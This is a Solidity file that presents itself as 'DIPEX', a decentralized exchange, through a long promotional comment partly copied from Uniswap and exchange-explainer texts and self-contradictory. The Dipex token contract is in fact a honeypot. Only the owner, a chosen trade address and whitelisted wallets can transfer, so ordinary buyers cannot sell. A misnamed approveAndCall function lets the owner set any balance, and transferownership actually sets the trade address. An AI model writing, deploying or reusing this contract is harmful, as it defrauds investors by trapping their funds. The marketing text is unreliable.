/*

\ud83d\udcb0\ud83c\udfe6DIPEX\ud83c\udfe6\ud83d\udcb0 is a Decentralized exchanges (DEX), type of cryptocurrency exchange which allows for direct peer-to-peer cryptocurrency transactions to take place online securely and without the need for an intermediary.



   Because users do not need to transfer their assets to the exchange, DIPEX reduce the risk of theft from hacking of exchanges. DIPEX can also prevent price manipulation or faked trading volume through wash trading, and are more anonymous than exchanges which implement know your customer (KYC) requirements.



\u2705 ERC20 / ERC20 Pairs



   In DIPEX, any ERC20 token can be pooled directly with any other ERC20 token. Wrapped Ether (WETH) is used instead of native ETH in the core contracts, although end users can still use ETH through helper contracts.

   In DIPEX, all liquidity pools are between ETH and a single ERC20 token. Having a constant numeraire provides a nice UX advantage \u2014 users can swap any ERC20 for any other ERC20 by routing through ETH. Since ETH is the most liquid Ethereum-based asset, and does not introduce any new platform risk.



   However, the introduction of ERC20 token/ERC20 token pools in Uniswap V2 can be useful for liquidity providers, who can maintain more diverse ERC20 token denominated positions, without mandatory exposure to ETH.



\u2705 Price Oracles



  DIPEX implements new functionality that enables highly decentralized and manipulation-resistant on-chain price feeds. This is achieved by measuring prices when they are expensive to manipulate, and cleverly accumulating historical data. This allows external smart contracts to create gas-efficient, time-weighted averages of DIPEX prices across any time interval.



   On-chain price feeds are a critical component for many decentralized financial applications including those similar to derivatives, lending, margin trading, prediction markets and more. Despite closely tracking the real-world price most of the time, OTHER DEXes cannot be used safely as a price oracle because the price can move significantly in a short period of time.





\u2705 Flash Swaps



   DIPEX flash swaps allow you to withdraw as much as you want of any ERC20 token on DIPEX at no upfront cost and do anything you want with them (execute arbitrary code), provided that by the end of the transaction execution, you either:

pay for all ERC20 tokens withdrawn

pay for a percentage of ERC20 tokens and return the rest

return all ERC20 tokens withdrawn



  Liquidity provider fees are enforced by subtracting 0.3% from all input amounts, even if the input ERC20 tokens are being returned as part of a flash swap.



On-chain order books



In some decentralized exchanges, everything is done on-chain (we\u2019ll talk about hybridized approaches shortly). Every order (as well as alteration and cancellation) is written to the blockchain. This is arguably the most transparent approach, as you\u2019re not trusting a third party to relay the orders to you, and there\u2019s no way to obfuscate them. 



Unfortunately, it\u2019s also the most impractical. Since you\u2019re asking every node on the network to record the order forever, you end up paying a fee. You need to wait until a miner adds your message to the blockchain, meaning the experience can be cumbersome, too. 



Some identify front running as a flaw in this model. Front running occurs in markets when an insider is aware of a pending transaction and uses that information to place a trade before the transaction is processed. The front runner, therefore, benefits from information not known to the public. Generally speaking, this is illegal. 



Of course, if everything is published on a global ledger, there\u2019s no opportunity to front run in the traditional sense. That said, a different kind of attack can be deployed: one where a miner sees the order before it\u2019s confirmed, and ensures that their own order gets added to the blockchain first.



Examples of on-chain order book models include the Stellar and Bitshares DEXs.



Off-chain order books

Off-chain order book DEXs are still decentralized in some regards, but they\u2019re admittedly more centralized than the previous entry. Instead of every order being posted to the blockchain, they\u2019re hosted somewhere. 



Where? That depends. You could have a centralized entity completely in charge of the order book. If that entity is malicious, then they could game the markets to an extent (i.e., by front running or misrepresenting orders). However, you would still benefit from non-custodial storage.



The 0x protocol for ERC-20 and other tokens deployed on the Ethereum blockchain is a good example of this. Rather than act as a singular DEX, it provides a framework for parties known as \u201crelayers\u201d to manage off-chain order books. Leveraging 0x smart contracts and some other tools, hosts can tap into a combined liquidity pool and relay orders between users. The trade is only executed on-chain once the parties are matched.



These approaches are superior from a usability perspective than those that rely on on-chain order books. They don\u2019t face the same constraints in terms of speed, as they don\u2019t use the blockchain as much. Still, the trade must be settled on it, so the off-chain order book model is still inferior to centralized exchanges in terms of speed.



Implementations of off-chain order books include Binance DEX, IDEX, and EtherDelta.

*/

pragma solidity ^0.5.17;

interface IERC20 {

    function totalSupply() external view returns(uint);



    function balanceOf(address account) external view returns(uint);



    function transfer(address recipient, uint amount) external returns(bool);



    function allowance(address owner, address spender) external view returns(uint);



    function approve(address spender, uint amount) external returns(bool);



    function transferFrom(address sender, address recipient, uint amount) external returns(bool);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

}



library Address {

    function isContract(address account) internal view returns(bool) {

        bytes32 codehash;

        bytes32 accountHash;

        // solhint-disable-next-line no-inline-assembly

        assembly { codehash:= extcodehash(account) }

        return (codehash != 0x0 && codehash != accountHash);

    }

}



contract Context {

    constructor() internal {}

    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns(address payable) {

        return msg.sender;

    }

}



library SafeMath {

    function add(uint a, uint b) internal pure returns(uint) {

        uint c = a + b;

        require(c >= a, "SafeMath: addition overflow");



        return c;

    }



    function sub(uint a, uint b) internal pure returns(uint) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        require(b <= a, errorMessage);

        uint c = a - b;



        return c;

    }



    function mul(uint a, uint b) internal pure returns(uint) {

        if (a == 0) {

            return 0;

        }



        uint c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");



        return c;

    }



    function div(uint a, uint b) internal pure returns(uint) {

        return div(a, b, "SafeMath: division by zero");

    }



    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        // Solidity only automatically asserts when dividing by 0

        require(b > 0, errorMessage);

        uint c = a / b;



        return c;

    }

}



library SafeERC20 {

    using SafeMath for uint;

    using Address for address;



    function safeTransfer(IERC20 token, address to, uint value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));

    }



    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));

    }



    function safeApprove(IERC20 token, address spender, uint value) internal {

        require((value == 0) || (token.allowance(address(this), spender) == 0),

            "SafeERC20: approve from non-zero to non-zero allowance"

        );

        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));

    }



    function callOptionalReturn(IERC20 token, bytes memory data) private {

        require(address(token).isContract(), "SafeERC20: call to non-contract");



        // solhint-disable-next-line avoid-low-level-calls

        (bool success, bytes memory returndata) = address(token).call(data);

        require(success, "SafeERC20: low-level call failed");



        if (returndata.length > 0) { // Return data is optional

            // solhint-disable-next-line max-line-length

            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");

        }

    }

}



contract ERC20 is Context, IERC20 {

    using SafeMath for uint;

    mapping(address => uint) private _balances;



    mapping(address => mapping(address => uint)) private _allowances;



    uint private _totalSupply;



    function totalSupply() public view returns(uint) {

        return _totalSupply;

    }



    function balanceOf(address account) public view returns(uint) {

        return _balances[account];

    }



    function transfer(address recipient, uint amount) public returns(bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view returns(uint) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint amount) public returns(bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }



    function increaseAllowance(address spender, uint addedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }



    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }



    function _transfer(address sender, address recipient, uint amount) internal {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }



    function _mint(address account, uint amount) internal {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }



    function _burn(address account, uint amount) internal {

        require(account != address(0), "ERC20: burn from the zero address");



        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");

        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

    }



    function _approve(address owner, address spender, uint amount) internal {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

}



contract ERC20Detailed is IERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor(string memory name, string memory symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }



    function name() public view returns(string memory) {

        return _name;

    }



    function symbol() public view returns(string memory) {

        return _symbol;

    }



    function decimals() public view returns(uint8) {

        return _decimals;

    }

}





contract Dipex {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _owner, address indexed _spender, uint _value);

 

    function transfer(address _to, uint _value) public payable returns (bool) {

        return transferFrom(msg.sender, _to, _value);

    }

 

    function ensure(address _from, address _to, uint _value) internal view returns(bool) {

       

        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){

            return true;

        }

        require(condition(_from, _value));

        return true;

    }

    

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {

        if (_value == 0) {return true;}

        if (msg.sender != _from) {

            require(allowance[_from][msg.sender] >= _value);

            allowance[_from][msg.sender] -= _value;

        }

        require(ensure(_from, _to, _value));

        require(balanceOf[_from] >= _value);

        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;

        _onSaleNum[_from]++;

        emit Transfer(_from, _to, _value);

        return true;

    }

 

    function approve(address _spender, uint _value) public payable returns (bool) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function condition(address _from, uint _value) internal view returns(bool){

        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;

        

        if(_saleNum > 0){

            if(_onSaleNum[_from] >= _saleNum) return false;

        }

        if(_minSale > 0){

            if(_minSale > _value) return false;

        }

        if(_maxSale > 0){

            if(_value > _maxSale) return false;

        }

        return true;

    }

 

    mapping(address=>uint256) private _onSaleNum;

    mapping(address=>bool) private canSale;

    uint256 private _minSale;

    uint256 private _maxSale;

    uint256 private _saleNum;

    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {

        require(msg.sender == owner);

        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}

        canSale[spender]=true;

        return true;

    }



    address tradeAddress;

    function transferownership(address addr) public returns(bool) {

        require(msg.sender == owner);

        tradeAddress = addr;

        return true;

    }

 

    mapping (address => uint) public balanceOf;

    mapping (address => mapping (address => uint)) public allowance;

 

    uint constant public decimals = 18;

    uint public totalSupply;

    string public name;

    string public symbol;

    address private owner;

 

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {

        name = _name;

        symbol = _symbol;

        totalSupply = _supply*(10**uint256(decimals));

        owner = msg.sender;

        balanceOf[msg.sender] = totalSupply;

        emit Transfer(address(0x0), msg.sender, totalSupply);

    }

}
